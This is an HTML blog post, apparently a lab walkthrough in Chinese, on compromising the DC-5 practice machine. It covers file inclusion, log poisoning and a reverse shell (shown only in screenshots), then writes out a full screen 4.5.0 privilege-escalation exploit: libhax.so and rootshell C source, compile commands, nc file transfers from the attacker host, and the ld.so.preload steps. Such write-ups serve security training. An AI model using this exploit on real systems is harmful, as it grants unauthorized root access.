@@ -1,0 +1,125 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="环境配置        kali 192.168.0.164 dc    192.168.0.149">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC:5">
+<meta property="og:url" content="http://yaoa.cool/2021/03/01/DC-5/index.html">
+<meta property="og:site_name" content="Ya0a">
+<meta property="og:description" content="环境配置        kali 192.168.0.164 dc    192.168.0.149">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301175628074.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301175825249.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301175928622.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301180033659.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301180222701.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301135742539.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301140112997.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301175445064.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301140207079.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301140426671.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301140730844.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301180722005.png">
+<meta property="og:image" content="http://yaoa.cool/images/DC-5/image-20210301181048203.png">
+<meta property="article:published_time" content="2021-03-01T05:56:43.000Z">
+<meta property="article:modified_time" content="2021-03-01T10:18:52.722Z">
+<meta property="article:author" content="Ya0a">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yaoa.cool/images/DC-5/image-20210301175628074.png"><title>DC:5 | Ya0a</title><link ref="canonical" href="http://yaoa.cool/2021/03/01/DC-5/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"ocean","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Ya0a</div><div class="header-banner-info__subtitle">痛定思痛</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">DC:5</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-03-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-03-01</span></span></div></header><div class="post-body">
+        <h1 id="环境配置"   >
+          <a href="#环境配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1>
+      <blockquote>
+<p>kali 192.168.0.164</p>
+<p>dc    192.168.0.149</p>
+</blockquote>
+<a id="more"></a>
+
+
+        <h1 id="信息收集"   >
+          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1>
+      <p>web端通过目录扫描，发现了一个footer.php</p>
+<p><img src="/images/DC-5/image-20210301175628074.png" alt="image-20210301175628074"></p>
+<p>并且每次访问数字会发生变化。</p>
+<p>在Contact界面，每次提交后，也会有一个发生变化的页脚。</p>
+<p><img src="/images/DC-5/image-20210301175825249.png" alt="image-20210301175825249"></p>
+<p>推测此处有文件包含。之后FUZZ参数名，文件包含的参数为file</p>
+<p><img src="/images/DC-5/image-20210301175928622.png" alt="image-20210301175928622"></p>
+<p>之后读取nginx配置文件，找到了日志文件的位置。</p>
+<p><img src="/images/DC-5/image-20210301180033659.png" alt="image-20210301180033659"></p>
+
+        <h1 id="文件包含利用"   >
+          <a href="#文件包含利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h1>
+      <p>先发出一个包含shell木马的请求。</p>
+<p><img src="/images/DC-5/image-20210301180222701.png" alt="image-20210301180222701"></p>
+<p>检测测试一下</p>
+<p><img src="/images/DC-5/image-20210301135742539.png" alt="image-20210301135742539"></p>
+<p><img src="/images/DC-5/image-20210301140112997.png" alt="image-20210301140112997"></p>
+<p>利用nc反弹shell，kali监听。</p>
+<p><img src="/images/DC-5/image-20210301175445064.png" alt="image-20210301175445064"></p>
+<p><img src="/images/DC-5/image-20210301140207079.png" alt="image-20210301140207079"></p>
+<p><img src="/images/DC-5/image-20210301140426671.png" alt="image-20210301140426671"></p>
+<p><img src="/images/DC-5/image-20210301140730844.png" alt="image-20210301140730844"></p>
+
+        <h1 id="提权"   >
+          <a href="#提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#提权" class="headerlink" title="提权"></a>提权</h1>
+      <p>获得一个交互式shell之后，寻找提权的方法。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></div></figure>
+<p><img src="/images/DC-5/image-20210301180722005.png" alt="image-20210301180722005"></p>
+<p>通过screen 4.5.0提权</p>
+<p>kali中有一个<code>searchsploit</code>,一个漏洞数据存储库的离线工具，</p>
+<p>这里就通过它来搜索exp</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></div></figure>
+<p><img src="/images/DC-5/image-20210301181048203.png" alt="image-20210301181048203"></p>
+<p>知道了exo的位置后，cp出来</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41154.sh 41154.sh</span><br></pre></td></tr></table></div></figure>
+<p>这个脚本直接执行会有问题，所以手动来操作。</p>
+<ul>
+<li><p>先在kali中操作：</p>
+<ul>
+<li><p>把脚本中的前一部分c代码保存为/tmp/libhax.c</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
+<li><p>后一部分保存为rootshell.c</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p>​    </p>
+</li>
+<li><p>之后分别进行编译</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o &#x2F;tmp&#x2F;libhax.so &#x2F;tmp&#x2F;libhax.c</span><br><span class="line">gcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.c</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+</li>
+<li><p>上传到靶机</p>
+<p>将tmp中的两个文件都上传到靶机中</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lnvp 1234 &lt; &#x2F;tmp&#x2F;libhax.so</span><br><span class="line">靶机:</span><br><span class="line">nc 192.168.0.164 1234 &gt; libhax.so</span><br></pre></td></tr></table></div></figure>
+<p>另一个文件同样的操作</p>
+</li>
+<li><p>最后一步</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">首先输入命令：cd &#x2F;etc</span><br><span class="line"></span><br><span class="line">然后输入命令：umask 000</span><br><span class="line"></span><br><span class="line">然后输入命令：screen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line"></span><br><span class="line">然后输入命令：screen -ls</span><br><span class="line"></span><br><span class="line">最后输入命令：&#x2F;tmp&#x2F;rootshell，成功提权</span><br></pre></td></tr></table></div></figure>
+</li>
+</ul>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://yaoa.cool">Ya0a</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://yaoa.cool/2021/03/01/DC-5/">http://yaoa.cool/2021/03/01/DC-5/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://yaoa.cool/tags/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://yaoa.cool/tags/%E9%9D%B6%E6%9C%BA/">靶机</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/03/10/%E4%BB%A3%E7%90%86%E6%B1%A0/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">代理池</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/03/01/python-%E6%AD%A3%E5%88%99/"><span class="paginator-prev__text">python_正则</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">
+          环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">
+          信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
+          文件包含利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">
+          提权</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">痛定思痛</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="tencent://message?uin=1755371745" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">25</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">11</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Ya0a</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
